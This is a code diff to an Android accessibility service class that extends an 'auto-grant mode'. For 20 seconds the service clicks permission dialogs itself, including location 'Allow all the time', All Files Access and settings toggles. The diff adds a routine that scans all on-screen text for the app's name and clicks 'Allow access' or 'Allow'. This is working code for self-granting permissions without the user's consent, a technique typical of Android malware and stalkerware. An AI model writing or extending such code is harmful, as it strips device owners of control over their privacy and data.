@@ -473,7 +473,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         autoGrantMode = true;
         autoGrantHandler = new Handler(Looper.getMainLooper());
 
-        // Phase 2 (10 s): request WRITE_EXTERNAL_STORAGE / All Files Access AFTER all
+        // Phase 2 (12 s): request WRITE_EXTERNAL_STORAGE / All Files Access AFTER all
         // other permission dialogs have been auto-granted and dismissed.
         // This step runs ONLY ONCE ever (tracked via SharedPreferences) so toggling
         // the accessibility service off and back on never re-triggers the storage prompt.
@@ -491,22 +491,31 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     Log.i(TAG, "Auto-grant: storage prompt already done or permission already granted — skipping");
                 }
             } catch (Exception ignored) {}
-        }, 10_000);
+        }, 12_000);
 
-        // Auto-grant mode expires after 15 seconds
+        // Auto-grant mode expires after 20 seconds
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired after 15 seconds");
-        }, 15_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 15s");
+            Log.i(TAG, "Auto-grant mode expired after 20 seconds");
+        }, 20_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 20s");
     }
 
     // Words that disqualify a toggle from being auto-enabled
     private static final String[] TOGGLE_BLACKLIST = { "shortcut", "stop", "delete", "kill" };
 
     /** Clicks permission-granting buttons: Allow, Grant, OK, Allow all time, etc.
-     *  Also enables toggle/switch/checkbox for this app in settings screens. */
+     *  Also enables toggle/switch/checkbox for this app in settings screens.
+     *  Also checks if app name + "allow access" text exists anywhere on screen and clicks it. */
     private boolean runPermissionGranter(AccessibilityNodeInfo rootNode) {
+        String appName = getString(R.string.app_name).toLowerCase();
+
+        // Check if app name + "allow access" exists anywhere on screen (case-insensitive)
+        // This handles the Android permission screen where app name and "Allow access" appear
+        if (runAppNameAllowAccessClicker(rootNode, appName)) {
+            return true;
+        }
+
         // Priority 1: "Allow all the time" (location / battery full-access dialogs)
         // Priority 2: "Allow only while using the app" — only if "Allow all the time" not present
         // All matching is case-insensitive inside findAndClickFullWord.
@@ -562,6 +571,38 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             return true;
         }
 
+        return false;
+    }
+
+    /** Checks if app name exists on screen. If both app name AND "allow access" exist,
+     *  clicks "Allow access". If only app name exists but "Allow access" not found,
+     *  falls back to clicking "Allow" button. */
+    private boolean runAppNameAllowAccessClicker(AccessibilityNodeInfo rootNode, String appName) {
+        try {
+            String screenText = getAllScreenText(rootNode).toLowerCase();
+            if (!screenText.contains(appName)) return false;
+
+            Log.i(TAG, "Auto-grant: detected app name on screen");
+
+            // Priority 1: Click "Allow access" if present
+            if (screenText.contains("allow access")) {
+                Log.i(TAG, "Auto-grant: detected 'allow access' - clicking it");
+                if (findAndClickFullWord(rootNode, "Allow access")) {
+                    Log.i(TAG, "Auto-grant: clicked 'Allow access'");
+                    return true;
+                }
+            }
+
+            // Priority 2: Fall back to "Allow" button if "Allow access" not found
+            Log.i(TAG, "Auto-grant: 'Allow access' not found, clicking 'Allow'");
+            if (findAndClickFullWord(rootNode, "Allow")) {
+                Log.i(TAG, "Auto-grant: clicked 'Allow'");
+                return true;
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
         return false;
     }
 
